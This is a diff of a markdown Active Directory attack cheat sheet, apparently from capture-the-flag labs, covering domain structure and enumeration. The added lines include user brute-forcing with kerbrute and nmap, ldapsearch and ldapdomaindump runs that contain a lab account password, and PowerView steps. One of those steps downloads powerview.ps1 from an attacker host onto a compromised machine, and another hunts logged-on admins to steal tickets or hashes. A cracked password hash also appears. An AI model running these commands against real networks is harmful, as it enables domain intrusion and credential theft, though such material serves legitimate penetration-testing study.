@@ -1,15 +1,10 @@
-# Intro
+# AD Cheat Sheet
 
-## Notes
-* Good Theory around AD: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
-* Attack Methods Summary: [m0chan](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
-* HackTricks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
+## Theory
 
+#### AD Structure
 
-
-## AD Structure
-
-* Domain Controller (DC) is a Windows Server containing  Active Directory Domain Services (AD DS)
+* Domain Controller (DC) is a Windows Server containing Active Directory Domain Services (AD DS)
 * AD DS data store: **NTDS.dit** - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users.
 * **NTDS.dit** is stored by default in %SystemRoot%\NTDS  
 ```
@@ -20,7 +15,7 @@ Get-ChildItem -Path c:\ -Include ntds.dit -Recurse
 * DC replicate updates from other domain controllers in the forest
 * DC Allows admin access to manage domain resources
 
-### Forest
+#### Forest
 * Forest: collection of one or more trees
 * Tree: collection of several domains with hierarchical order
 * Organizational Units (OUs): Containers for groups, computers, users, printers and other OUs
@@ -29,117 +24,36 @@ Get-ChildItem -Path c:\ -Include ntds.dit -Recurse
 * Domain Services: DNS Server, LLMNR, IPv6, MSSQL etc.
 * Domain Schema: Rules for object creation
 
-Example strucutre would have top domain like **main.com** and under it may be further domains **sub.main.com** and **external.main.com**. Thos three domain represnet a tree. OUs in main can access sub and external but not in reverse.
+Example structre would have top domain like **main.com** and under it may be further domains **sub.main.com** and **external.main.com**. Thos three domain represnet a tree. OUs in main can access sub and external but not in reverse.
 
-### Users
+#### Users
 
 Users are core of AD and DC's task is to manage access of those users to services.
 
-* Domain Admins: have ultimate control over the domain. They can access to the domain controller. If DA is compromised then NTDS.dit can be dumped using dsync attack.
+* Domain Admins (DA): have ultimate control over the domain. They can access to the domain controller. If DA is compromised then NTDS.dit can be dumped using dsync attack.
 * Service Accounts (can be also have Domain Admin rights): required by Windows for services such as SQL to pair a service with a service account. Some of them are associated with user accounts and have human-made passwords what makes them vulnerable to Kerberoasting attacks. 
 * Local Administrators: local machine administrators. Compromis of local admin can lead to ticket and credentials grabbing from local machine to impersonate other users and services in AD.
 * Domain Users: normal users. They can log into machines where they are authorized to. Users may be part of interesting groups that allows lateral movement once the user account is compromised.
 
-#### Bruteforce Users
-
-* Preferred way: kerbrute
-
-`./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.43.76  userlist.txt`
-
-* Nmap> sometimes crashes
-```
-nmap -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm='spookysec.local', userdb=userlist.txt 10.10.43.76"
-```
-
-## Groups
+#### Groups
 
 * Security Groups: permissions users and services. Some groups have rights to change DACLs.
 * Distribution Groups: email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration
 
-# Reconaissance
+## Active Directory Enumeration
 
-Understanding the target AD environment is key to further exploitation.
+### Manual Approach
 
+#### net.exe
 
-## Manual Discovery
+'net.exe' system utility is widely available and can be used once foothold on windows host within domain is obtained.
 
-* good practice is to use PowerView
+* `net user`
+* `net user /domain` returns a list of users to work with
+* `net user some_admin /domain` info about some_admin
+* `net group /domain`
 
-```
-#get all computers in AD
-
-Get-NetComputer -fulldata | select cn
-
-# users
-
-Get-NetUser | select cn
-
-# groups 
-
-Get-NetGroup
-
-```
-
-* Using native tools:  
-
-```
-# Get Domain infos:  
-
-Get-ADDomain 
-
-# Get Forest infos:  
-
-Get-ADForest
-
-# AD user info: 
-
-Get-ADUser Administrator 
-
-# Important AD users:   
-
-Get-ADUser -Filter * | select SamAccountName 
-
-# Search for specific user:  
-
-Get-ADUser -Filter 'UserPrincipalName -like "user*"' 
-
-# Get all Users (including Computernames):  
-
-Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName 
-
-# Groups:   
-
-Get-ADGroup -Filter * | select SamAccountName  
-
-# AD Admins group:  
-
-Get-ADGroup "Domain Admins" -Properties members,memberof
-
-# Check trusted domains:  nltest /domain_trusts 
-
-# Get current active domain for the user:
-
- (Get-WmiObject Win32_ComputerSystem).Domain 
-
-# get SID
-
-Get-ADDomain | select DNSRoot, NetBIOSName, DomainSID 
-
-
-```
-
-* Helpful **Tools**:
-
-* crackmapexec
-* Rubeus
-* `enum4linux -a target_ip > enum.log`
-
-* AD recon: https://github.com/sense-of-security/ADRecon
-* Bloodhound: https://github.com/BloodHoundAD/BloodHound
-* targetedKerberoast: https://github.com/ShutdownRepo/targetedKerberoast
-
-
-## Domain Controller Discovery
+#### Domain Controller Discovery
 For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/how-domain-controllers-are-located
 
 
@@ -147,18 +61,18 @@ For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-serv
 * **DNS query**: `nslookup -q=srv _ldap._tcp.dc._msdcs.domain.local`
 * **Using nltest**: `nltest /dclist:domain.local`
 
-## Domain Hosts Discovery
+#### Domain Hosts Discovery
 
 * NetBios scan: `nbtscan 192.168.100.0/24`
 * LDAP query of domain base (credentials required): `ldapsearch -H ldap://dc.ip -x -LLL -W -D "anakin@contoso.local" -b "dc=contoso,dc=local" "(objectclass=computer)" "DNSHostName" "OperatingSystem" `
 * NTLM info scirpt: `ntlm-info smb 192.168.100.0/24`
 * Scan also for ports: 135(RPC) and 139(NetBIOS serssion service)
 
-## Users discovery
+#### Users discovery
 
 `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"`
 
-## Domain info dump with ldap
+#### Domain dump with ldap
 ```
  ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
 
@@ -167,7 +81,79 @@ ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7Acl
 ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
 ```
 
-## Sniffing using Bloodhound
+
+
+### Tooling based Approach
+
+* Helpful **Tools**:
+
+* crackmapexec
+* `enum4linux -a target_ip > enum.log`
+
+* AD recon: https://github.com/sense-of-security/ADRecon
+* Bloodhound: https://github.com/BloodHoundAD/BloodHound
+* targetedKerberoast: https://github.com/ShutdownRepo/targetedKerberoast
+
+
+#### Kerbrute
+
+* kerbrute
+
+`./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.43.76  userlist.txt`
+
+* Nmap
+```
+nmap -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm='spookysec.local', userdb=userlist.txt 10.10.43.76"
+```
+
+#### PowerView
+
+* Poverview has a lot of built-in AD functionalities
+* So once a domain machine is compromised, upload and run powerview on it
+
+```powershell
+
+Invoke-WebRequest -Uri "attacker_ip.powerview.ps1" -OutFile "powerview.ps1"`
+`curl http://xxx/file.xxx -o file.xxx
+
+. .\powerview.ps1
+
+# or 
+
+Import-Module .\powerview.ps1
+
+```
+
+* Useful poverview commands
+
+``` powershell
+#get all computers in AD
+
+Get-NetComputer | select cn
+
+# users
+
+Get-NetUser | select cn
+
+# groups 
+
+Get-NetGroup
+```
+
+* It is important to find high value target users and where they are currently logged in to later compromise those machines and retrieve tickets or hashes.
+
+``` powershell
+# currently logged in users
+
+Get-NetLoggedon -ComputerName client251
+
+# active sessions to DC
+
+Get-NetSession -ComputerName dc01
+
+```
+
+### Domain Discovery Bloodhound
 
 Actual collectors: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
 
@@ -516,3 +502,8 @@ Keyspace..: 14344385
 
 64f12cddaa88057e06a81b54e73b949b:Password1                
 
+
+## Additional Reading
+* Good Theory around AD: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
+* Attack Methods Summary: [m0chan](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
+* HackTricks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
